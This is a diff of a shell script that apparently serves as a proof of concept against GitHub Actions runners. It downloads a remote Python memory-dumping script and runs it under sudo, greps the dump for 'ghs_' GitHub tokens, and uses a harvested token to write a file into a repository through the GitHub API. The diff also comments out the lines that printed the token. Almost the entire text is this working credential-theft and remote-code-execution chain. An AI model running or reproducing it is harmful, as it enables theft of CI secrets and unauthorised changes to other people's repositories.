@@ -2,23 +2,24 @@
 set -e
 
 readonly REPO="thi3nl0ng/thi3nl0ng.github.io"
+FILE=r3s34rch.md
 TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u`
 
-echo "-----------------------------------------------------------------"
-echo "${TOKEN_VAL}"
-echo "-----------------------------------------------------------------"
+#echo "-----------------------------------------------------------------"
+#echo "${TOKEN_VAL}"
+#echo "-----------------------------------------------------------------"
 
 curl \
   -H "Accept: application/vnd.github.v3+json" \
   -H "Authorization: token $TOKEN_VAL" \
-  "https://api.github.com/repos/${REPO}/contents/README3.md"
+  "https://api.github.com/repos/${REPO}/contents/${FILE}"
 
 curl \
     -X PUT \
     -H "Accept: application/vnd.github.v3+json" \
     -H "Authorization: token $TOKEN_VAL" \
-    "https://api.github.com/repos/${REPO}/contents/README3.md" \
-    -d '{"message":"message","hello from r3s34rch":"'$(echo content|base64)'", "sha":"SHA_FROM_ABOVE"}'
+    "https://api.github.com/repos/${REPO}/contents/${FILE}" \
+    -d '{"message":"message","content":"'$(echo hello from r3s34rch|base64)'", "sha":"SHA_FROM_ABOVE"}'
             
 #gh api --silent \
 #  --method POST \
